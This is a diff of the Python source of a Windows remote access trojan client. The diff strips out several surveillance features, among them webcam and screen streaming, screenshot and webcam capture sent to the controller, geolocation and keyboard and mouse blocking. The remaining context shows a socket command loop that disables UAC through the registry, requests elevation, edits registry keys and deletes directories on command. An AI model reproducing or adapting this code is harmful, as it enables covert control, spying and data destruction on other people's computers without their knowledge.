@@ -1,21 +1,14 @@
-import random
 import socket, subprocess, os, platform
 from threading import Thread
 from PIL import Image
 from datetime import datetime
 from ctypes import cast, POINTER
-from comtypes import CLSCTX_ALL
 from winreg import *
 import shutil
 import glob
 import ctypes
 import sys
-import webbrowser
-import re
 import pyautogui
-import cv2
-import urllib.request
-import json
 from pynput.keyboard import Listener
 from pynput.mouse import Controller
 import time
@@ -24,9 +17,8 @@ import keyboard
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
 
-HWND_BROADCAST = 65535
-WM_SYSCOMMAND = 274
-SC_MONITORPOWER = 61808
+#HWND_BROADCAST = 65535
+#WM_SYSCOMMAND = 274
 GENERIC_READ = -2147483648
 GENERIC_WRITE = 1073741824
 FILE_SHARE_WRITE = 2
@@ -105,34 +97,9 @@ class RAT_CLIENT:
                     s.send(output.encode())
                     if not output:
                         self.errorsend()
-            
-            elif command == 'screenshare':
-                try:
-                    from vidstream import ScreenShareClient
-                    screen = ScreenShareClient(self.host, 8080)
-                    screen.start_stream()
-                except:
-                    s.send("Impossible to get screen")
-            
-            elif command == 'webcam':
-                try:
-                    from vidstream import CameraClient
-                    cam = CameraClient(self.host, 8080)
-                    cam.start_stream()
-                except:
-                    s.send("Impossible to get webcam")
-            
-            elif command == 'breakstream':
-                pass
 
             elif command == 'list':
                 pass
-
-            elif command == 'geolocate':
-                with urllib.request.urlopen("https://geolocation-db.com/json") as url:
-                    data = json.loads(url.read().decode())
-                    link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
-                s.send(link.encode())
             
             elif command == 'setvalue':
                 const = s.recv(1024).decode()
@@ -203,38 +170,6 @@ class RAT_CLIENT:
                     s.send("Key is created".encode())
                 except:
                     s.send("Impossible to create key".encode())
-            
-            elif command == 'volumeup':
-                try:
-                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
-                    devices = AudioUtilities.GetSpeakers()
-                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-                    volume = cast(interface, POINTER(IAudioEndpointVolume))
-                    if volume.GetMute() == 1:
-                        volume.SetMute(0, None)
-                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
-                    s.send("Volume is increased to 100%".encode())
-                except:
-                    s.send("Module is not founded".encode())
-            
-            elif command == 'volumedown':
-                try:
-                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
-                    devices = AudioUtilities.GetSpeakers()
-                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-                    volume = cast(interface, POINTER(IAudioEndpointVolume))
-                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
-                    s.send("Volume is decreased to 0%".encode())
-                except:
-                    s.send("Module is not founded".encode())
-            
-            elif command == 'setwallpaper':
-                pic = s.recv(6000).decode()
-                try:
-                    ctypes.windll.user32.SystemParametersInfoW(20, 0, pic, 0)
-                    s.send(f'{pic} is set as a wallpaper'.encode())
-                except:
-                    s.send("No such file")
 
             elif command == 'usbdrivers':
                 p = subprocess.check_output(["powershell.exe", "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }"], encoding='utf-8')
@@ -320,44 +255,8 @@ User: {os.getlogin()}
                 s.send('MessageBox has appeared'.encode())
                 user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)
             
-            elif command.startswith("disable") and command.endswith("--all"):
-                Thread(target=self.disable_all, daemon=True).start()
-                s.send("Keyboard and mouse are disabled".encode())
-            
-            elif command.startswith("disable") and command.endswith("--keyboard"):
-                global kbrd
-                kbrd = True
-                Thread(target=self.disable_keyboard, daemon=True).start()
-                s.send("Keyboard is disabled".encode())
-            
-            elif command.startswith("disable") and command.endswith("--mouse"):
-                global mousedbl
-                mousedbl = True
-                Thread(target=self.disable_mouse, daemon=True).start()
-                s.send("Mouse is disabled".encode())
-            
             elif command == 'disableUAC':
                 os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
-            
-            elif command.startswith("enable") and command.endswith("--keyboard"):
-                kbrd = False
-                s.send("Mouse and keyboard are unblocked".encode())
-            
-            elif command.startswith("enable") and command.endswith("--mouse"):
-                mousedbl = False
-                s.send("Mouse is enabled".encode())
-
-            elif command.startswith("enable") and command.endswith("--all"):
-                user32.BlockInput(False)
-                s.send("Keyboard and mouse are enabled".encode())
-                
-            elif command == 'turnoffmon':
-                s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned off".encode())
-                user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
-            
-            elif command == 'turnonmon':
-                s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned on".encode())
-                user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
             
             elif command == 'extendrights':
                 ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
@@ -549,53 +448,6 @@ User: {os.getlogin()}
                 try:
                     shutil.rmtree(command[6:])
                     s.send(f'Directory {command[6:]} was removed'.encode())
-                except:
-                    self.errorsend()
-            
-            elif command == 'browser':
-                quiery = s.recv(6000)
-                quiery = quiery.decode()
-                try:
-                    if re.search(r'\.', quiery):
-                        webbrowser.open_new_tab('https://' + quiery)
-                    elif re.search(r'\ ', quiery):
-                        webbrowser.open_new_tab('https://yandex.ru/search/?text='+quiery)
-                    else:
-                        webbrowser.open_new_tab('https://yandex.ru/search/?text=' + quiery)
-                    s.send("The tab is opened".encode())
-                except:
-                    self.errorsend()
-            
-            elif command == 'screenshot':
-                try:
-                    file = f'{random.randint(111111, 444444)}.png'
-                    file2 = f'{random.randint(555555, 999999)}.png'
-                    pyautogui.screenshot(file)
-                    image = Image.open(file)
-                    new_image = image.resize((1920, 1080))
-                    new_image.save(file2)
-                    file = open(file2, 'rb')
-                    data = file.read()
-                    s.send(data)
-                except:
-                    self.errorsend()
-            
-            elif command == 'webcam_snap':
-                try:
-                    file = f'{random.randint(111111, 444444)}.png'
-                    file2 = f'{random.randint(555555, 999999)}.png'
-                    global return_value, i
-                    cam = cv2.VideoCapture(0)
-                    for i in range(1):
-                        return_value, image = cam.read()
-                        filename = cv2.imwrite(f'{file}', image)
-                    del(cam)
-                    image = Image.open(file)
-                    new_image = image.resize((1920, 1080))
-                    new_image.save(file2)
-                    file = open(file2, 'rb')
-                    data = file.read()
-                    s.send(data)
                 except:
                     self.errorsend()
 
